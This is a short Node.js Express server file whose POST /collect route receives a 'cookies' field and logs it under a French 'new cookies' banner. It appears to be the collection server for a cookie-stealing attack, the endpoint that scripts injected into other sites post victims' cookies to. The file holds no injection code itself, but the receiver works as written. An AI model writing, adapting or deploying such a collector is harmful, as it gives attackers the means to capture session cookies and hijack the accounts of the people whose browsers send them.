const express = require("express");
const app = express();

app.use(express.json());

app.post("/collect", (req, res) => {
  console.log("===== NOUVEAUX COOKIES =====");
  console.log(req.body.cookies);
  console.log("=============================");
  res.json({ status: "ok" });
});

app.get("/", (req, res) => {
  res.send("Le serveur fonctionne !");
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
